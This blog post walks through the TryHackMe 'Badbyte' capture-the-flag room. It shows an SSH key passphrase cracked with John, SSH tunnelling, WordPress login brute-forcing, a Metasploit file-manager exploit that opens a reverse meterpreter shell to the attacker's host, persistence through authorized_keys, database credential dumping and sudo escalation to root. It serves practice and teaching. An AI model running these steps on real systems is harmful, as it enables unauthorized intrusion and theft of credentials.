---
layout: post
title: TryHackMe Walkthrough - Badbyte
date: 2021-04-18
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Boot2Root
- Easy
- Machine
permalink: /2021/04/TryHackMe-Walkthrough-Badbyte/
img: 2021/04/Badbyte/badbyte.png
---

This is my walkthrough of the [Badbyte room on TryHackMe](https://tryhackme.com/room/badbyte). This is an easy room, but it still got me to learn a few things. Every tasks in the room starts with some explanation about how to approach it, and which tools you should be using to do it. I tried to ignore those as much as possible to make the room more challenging. 

* Room: Badbyte
* Difficulty: Easy
* URL: https://tryhackme.com/room/badbyte

Task 1 was only to start the machine. So I clicked the button, launched my Kali virtual machine and add the box IP to my hosts file. 

```bash
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.48.223           target
```

I find that having an hostname makes things easier for me. Mostly, I can use the commands from [my notes](https://github.com/EricHogue/HackingNotes) and copy them directly in a terminal without having to change anything (I'm lazy). 

## Task 2 - Reconnaissance
This task consists on scanning for open ports on the target machine. There are some explanation about using nmap to do it. 

I ran RustScan instead of nmap as I'm experimenting with it.

```bash
$ rustscan -a target -- -A -script vuln | tee rust.txt 
.----. .-. .-. .----..---.  .----. .---..--.  .-. .-.
| {}  }| { } |{ {__ {__}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\ }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy:
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml" 
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.48.223:22  
Open 10.10.48.223:30024 

...

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
30024/tcp open  ftp     syn-ack vsftpd 3.0.3
```

There are two ports opened on the machine:
* 22 running ssh
* 30024 running ftp

This gave me the answers to the questions of this section.

```
How many ports are open?
2

What service is running on the lowest open port?
ssh

What non-standard port is open?
30024

What service is running on the non-standard port?
ftp
```


## Task 3 - Foothold

I tried connecting to the FTP server. It accepted anonymous logins. Once connected, I downloaded the two files I found on it.

```bash
$ ftp target 30024
Connected to target.
220 (vsFTPd 3.0.3)
Name (target:ehogue): anonymous

331 Please specify the password.
Password:

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r-- 1 ftpftp 1743 Mar 23 20:03 id_rsa
-rw-r--r-- 1 ftpftp78 Mar 23 20:09 note.txt
226 Directory send OK.

ftp> get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1743 bytes).
226 Transfer complete.
1743 bytes received in 0.00 secs (1.0318 MB/s)

ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (78 bytes).
226 Transfer complete.
78 bytes received in 0.00 secs (15.3079 kB/s)
```

I looked at the note.txt file. It contains an explanation (a bad one) about why there is an ssh key in there.

```
cat note.txt 
I always forget my password. Just let me store an ssh key here.
- errorcauser
```

I tried using the ssh key with the `errorcauser` username to connect to the server, but it requires a password.

```bash
$ chmod 600 id_rsa 

$ ssh errorcauser@target -i id_rsa 
The authenticity of host 'target (10.10.48.223)' can't be established.
ECDSA key fingerprint is SHA256:UR0k9a7qaFtt3RxI1gSKeBdDz+4jrasPZ6i0Mtkq10Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target,10.10.48.223' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```

So I started cracking it's password with John. If you don't know how to do it, the room has some explanation. 

```bash
$ python2 /usr/share/john/ssh2john.py id_rsa > john.hash

$ john john.hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
SSH_KEY_PASSWORD (id_rsa)
1g 0:00:00:29 DONE (2021-04-17 09:38) 0.03417g/s 490146p/s 490146c/s 490146C/sa6_123..*7¡Vamos!
Session completed

```

This gave me the answers to the two questions of the section.

```
What username do we find during the enumeration process?
errorcauser

What is the passphrase for the RSA private key?
SSH_KEY_PASSWORD
```

I could then use this information to connect to the server's ssh. 

```bash
$ ssh errorcauser@target -i id_rsa 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-139-generic x86_64)

...

-bash-4.4$ ls
bin  dev  etc  lib  lib64  note.txt

-bash-4.4$ cat note.txt 
Hi Error!
I've set up a webserver locally so no one outside could access it.
It is for testing purposes only.  There are still a few things I need to do like setting up a custom theme.
You can check it out, you already know what to do.
-Cth
:)
```

## Task 4 - Port Forwarding
The message and the task name make it clear that I need to use port forwarding to get access to the machine. I tried running netstat to list the opened ports, but we seem to be running in a limited shell and the command is not available. 

So I needed to use dynamic port forwarding like explained in the task. I never did that before, so I followed the instructions from the task to do it. 

First setup dynamic port forwarding. 

```bash
ssh -i id_rsa -D 1337 errorcauser@target
```

Keep the ssh connection, open a new local terminal and set proxy chain to allowed scanning the server.

```bash
cat /etc/proxychains.conf 
...
#socks4127.0.0.1 9050
socks5 127.0.0.1 1337 
```

Now use proxychains to run nmap using the tunnel.
```
$ proxychains nmap -sT 127.0.0.1  
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 07:43 EDT 
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK 
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:995 <--socket error or timeout!  
...
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:3306  ...  OK  
...
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK 
...
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:22  ...  OK 
...
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:1723 <--socket error or timeout! 
...

Nmap scan report for localhost (127.0.0.1)
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT  STATE SERVICE
22/tcpopen  ssh
80/tcpopen  http
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 473.67 seconds
```

This took some time to run, but it quickly showed that port 80 and 3306 are also opened. 

With this, I had the answers to the questions of this task.

```
What main TCP ports are listening on localhost?
80,3306

What protocols are used for these ports?
http,mysql
```

Now I created an ssh tunnel for port 80 and loaded [localhost](http://localhost/) in my browser.

```bash
ssh -i id_rsa -L 80:127.0.0.1:80 errorcauser@target
```

![Web Site](/assets/images/2021/04/Badbyte/01_WebSite.png "Web Site")

## Task 5 - Web Exploitation

Now we have a Wordpress site. I always use WPScan on Wordpress to enumerate possible users and get the list of plugins with their possible vulnerabilities.

```bash
$ wpscan --url http://localhost/ -e vp,u  [46/46]
_______________________________________________________________ 
__ ____________ 
\ \  / /  __ \ / ____|
 \ \  /\  / /| |__) | (______  __ _ _ __ ® 
  \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
   \  /\  /  | |  ____) | (__| (_| | | | |
    \/  \/|  |_____/ \___|\__,_|_| |_|

WordPress Security Scanner by the WPScan Team
 Version 3.8.17 
 Sponsored by Automattic - https://automattic.com/ 
 @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time. 
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ... 
[i] Update completed. 
 
[+] URL: http://localhost/ [::1]  
[+] Started: Sun Apr 18 08:03:08 2021
 
Interesting Finding(s):
 
[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)  
 | Found By: Headers (Passive Detection)
 | Confidence: 100% 

[+] XML-RPC seems to be enabled: http://localhost/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:  
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
 
[+] WordPress readme found: http://localhost/readme.html
 | Found By: Direct Access (Aggressive Detection)  
 | Confidence: 100% 

[+] The external WP-Cron seems to be enabled: http://localhost/wp-cron.php  
 | Found By: Direct Access (Aggressive Detection)  
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299
 
[+] WordPress version 5.7 identified (Insecure, released on 2021-03-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://localhost/?feed=rss2, <generator>https://wordpress.org/?v=5.7</generator>
 |  - http://localhost/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.7</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://localhost/wp-content/themes/twentytwentyone/
 | Latest Version: 1.2 (up to date)
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://localhost/wp-content/themes/twentytwentyone/readme.txt
 | Style URL: http://localhost/wp-content/themes/twentytwentyone/style.css?ver=1.2
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://localhost/wp-content/themes/twentytwentyone/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] cth
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Apr 18 08:03:24 2021
[+] Requests Done: 65
[+] Cached Requests: 6
[+] Data Sent: 14.752 KB
[+] Data Received: 16.619 MB
[+] Memory used: 199.207 MB
[+] Elapsed time: 00:00:15

```

The scan did not detect any plugins, but it found one user (cth). I went to the [Wordpress login page](http://localhost/wp-login.php) to try that user and Wordpress was kind enough to confirm it exists. 

![User exists](/assets/images/2021/04/Badbyte/02_UserExists.png "User exists")

Knowing that user, I launched a brute force attack to try to find their password while I continues looking around the site. It continued while I was working on the box, but never found the password.

```bash
wpscan --url http://localhost/ --usernames cth --passwords /usr/share/wordlists/rockyou.txt --max-threads 25
```

I first used 50 threads with WPScan, but it killed the database after a few minutes, so I had to restart the server and retry with only 25 threads.

The scan says that the version of Wordpress (5.7) is insecure. I found a CVE about sensitive data exposure in that version of Wordpress, but it requires to be logged in to exploit it. So I moved to something else.

I started to look around the site and did not find anything really interesting. It only have one post with one comment. There is something about it using Gravatar. Maybe that can be used. 

After looking around for a while, I decided to try finding plugins with [nmap Wordpress script](https://nmap.org/nsedoc/scripts/http-wordpress-enum.html) since WPScan was not finding anything interesting.

```bash
$ nmap -sV --script http-wordpress-enum -p 80 localhost
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 09:15 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00016s latency).
Other addresses for localhost (not scanned): ::1

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-wordpress-enum: 
| Search limited to top 100 themes/plugins
|   plugins
|_    duplicator 1.3.26

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.88 seconds
```

This found a plugin. And it only looked at the top 100. So I relaunched it with a bigger limit. A limit of 1000 did not find anything more. So I tried again with 10 000. 

```bash
$ nmap -sV --script http-wordpress-enum --script-args search-limit=10000 -p 80 localhost 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 09:46 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00034s latency).
Other addresses for localhost (not scanned): ::1

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-wordpress-enum: 
| Search limited to top 4778 themes/plugins
|   plugins
|     duplicator 1.3.26
|_    wp-file-manager 6.0

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 314.22 seconds

```

We now have two plugins to look at. The duplicator plugin has an [arbitrary file read vulnerability](https://www.exploit-db.com/exploits/49288). And the wp-file-manager plugin is vulnerable to [Remote Code Execution](https://www.exploit-db.com/exploits/49178). 

I decided to try using Metasploit to exploit the RCE vulnerability to get a shell. 

```bash
msfconsole 

msf6 > search CVE-2020-25213

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  exploit/multi/http/wp_file_manager_rce  2020-09-09       normal  Yes    WordPress File Manager Unauthenticated Remote Code Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_file_manager_rce

msf6 > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_file_manager_rce) > show options 

Module options (exploit/multi/http/wp_file_manager_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND    upload           yes       elFinder commands used to exploit the vulnerability (Accepted: upload, mkfile+put)
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to WordPress installation
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   WordPress File Manager 6.0-6.8
   
msf6 exploit(multi/http/wp_file_manager_rce) > set rhosts localhost
rhosts => localhost
msf6 exploit(multi/http/wp_file_manager_rce) > set lhost 10.13.3.36
lhost => 10.13.3.36
msf6 exploit(multi/http/wp_file_manager_rce) > exploit
[*] Exploiting target {:address=>"0.0.0.1", :hostname=>"localhost"}

[*] Started reverse TCP handler on 10.13.3.36:4444 
[*] Executing automatic check (disable AutoCheck to override)
[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. Enable ForceExploit to override check result.
[*] Exploiting target {:address=>"127.0.0.1", :hostname=>"localhost"}
[*] Started reverse TCP handler on 10.13.3.36:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] 127.0.0.1:80 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/8tfwkm.php
[*] Sending stage (39282 bytes) to 10.10.48.223
[+] Deleted 8tfwkm.php
[*] Meterpreter session 1 opened (10.13.3.36:4444 -> 10.10.48.223:57278) at 2021-04-18 11:08:43 -0400
[*] Session 1 created in the background.

msf6 exploit(multi/http/wp_file_manager_rce) > sessions 

Active sessions
===============

  Id  Name  Type                   Information           Connection
  --  ----  ----                   -----------           ----------
  1         meterpreter php/linux  cth (1000) @ badbyte  10.13.3.36:4444 -> 10.10.48.223:57278 (127.0.0.1)

msf6 exploit(multi/http/wp_file_manager_rce) > sessions 1
[*] Starting interaction with 1...

meterpreter > shell
Process 22052 created.
Channel 0 created.

whoami
cth
```

I had a remote shell. I looked at the user's home folder and found the user flag.

```bash
ls /home
cth
errorcauser

ls /home/cth
user.txt

cat /home/cth/user.txt
THE_USER_FLAG
```

To get a better shell, I copied my public key on the server and reconnected using ssh.

```bash
mkdir .ssh
echo "ssh-rsa SSH KEY" > .ssh/authorized_keys
chmod 700 .ssh
chmod 600 .ssh/authorized_keys

# From my machine
ssh cth@target
```

Now I could answer the questions for the task.

```
What CMS is running on the machine?
wordpress

What is the CVE number for directory traversal vulnerability?
CVE-2020-11738

What is the CVE number for remote code execution vulnerability?
CVE-2020-25213

What is the name of user that was running CMS?
cth

What is the user flag?
THE_USER_FLAG
```

## Task 6 - Privilege Escalation

Now that I was connected, I tried running `sudo -l`, but the user needs a password to run sudo. They do not have any crontab either, so I started looking around the server. I could have used [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), but I always try to find issues by myself first. 

While looking around, I found the MySQL password for the Wordpress database in `/etc/wordpress/config-default.php`. I tried that password for the cth user, but it did not work.

```bash
cth@badbyte:/usr/share/wordpress$ cat /etc/wordpress/config-default.php
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'THE_DB_PASSWORD');
define('DB_HOST', 'localhost');
define('DB_COLLATE', 'utf8_general_ci');
define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
?>
```

I used the found credentials to connect to the database and looked around. 

```bash
mysql -uwordpress -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 31512
Server version: 5.7.33-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.00 sec)

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> use wordpress
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------+
| Tables_in_wordpress    |
+------------------------+
| wp_commentmeta         |
| wp_comments            |
| wp_duplicator_packages |
| wp_links               |
| wp_options             |
| wp_postmeta            |
| wp_posts               |
| wp_term_relationships  |
| wp_term_taxonomy       |
| wp_termmeta            |
| wp_terms               |
| wp_usermeta            |
| wp_users               |
| wp_wpfm_backup         |
+------------------------+
14 rows in set (0.00 sec)

mysql> select * From wp_users;
+----+------------+------------------------------------+---------------+----------------+------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email     | user_url         | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+----------------+------------------+---------------------+---------------------+-------------+--------------+
|  1 | cth        | $P$BobwiFHLgI5vaEbTSeHsr24qjpJBEP0 | cth           | cth@badbyte.bb | http://localhost | 2021-03-23 19:02:50 |                     |           0 | cth          |
+----+------------+------------------------------------+---------------+----------------+------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)
```

This gave me the hash to cth password. I used hashcat to try to break force it. Just like the other brute force, this ran all the time I was working on the box, but did not find the password.

```bash
$ hashcat -a0 -m 400 hash.txt /usr/share/wordlists/rockyou.txt
```

I kept looking around and after a while, I found the file `/var/log/bash.log`.  Looking at it, it looks like the logs of a bash session, with the commands and responses. 

```
^[]0;cth@badbyte: ~^G^[[01;32mcth@badbyte^[[00m:^[[01;34m~^[[00m$ suod su^M
^M
Command 'suod' not found, did you mean:^M
^M
  command 'sudo' from deb sudo^M
  command 'sudo' from deb sudo-ldap^M
^M
Try: sudo apt install <deb name>^M
^M
^[]0;cth@badbyte: ~^G^[[01;32mcth@badbyte^[[00m:^[[01;34m~^[[00m$ THE_USER_PASSWORD ^H^[[K0^M
PART_OF_THE_PASSWORD: command not found^M
^[]0;cth@badbyte: ~^G^[[01;32mcth@badbyte^[[00m:^[[01;34m~^[[00m$ passwd^M
Changing password for cth.^M
(current) UNIX password: ^M
Enter new UNIX password: ^M
Retype new UNIX password: ^M
passwd: password updated successfully^M
```

In it, there is something that looks like a password, so I tried it as the user password. And it worked.

```bash
cth@badbyte:/usr/share/wordpress$ sudo -l
[sudo] password for cth: 
Matching Defaults entries for cth on badbyte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cth may run the following commands on badbyte:
    (ALL : ALL) ALL
```

The cth user is allowed to run anything as anyone. I used sudo to run su and become root. Then I just output the root flag with cat. 

```bash

cth@badbyte:/usr/share/wordpress$ sudo su -
root@badbyte:~# whoami
root
root@badbyte:~# cat /root/root.txt 
...

THE_ROOT_FLAG

 ________________________
< Made with ❤ by BadByte >
 ------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
root@badbyte:~# 
```

I then answered that last two questions of the room. 

```
What is the user's old password?
THE_USER_PASSWORD

What is the root flag?
THE_ROOT_FLAG
```

## Conclusion
This room is not hard, especially if you read the instructions before doing the tasks. I did most of it without reading. However I needed the instructions for the dynamic ssh tunnel. I had never done that before. 

And I learned that I rely to much on WPScan to find plugins when attacking a Wordpress box. From now on, I will also use nmap as it seems to find more plugins. 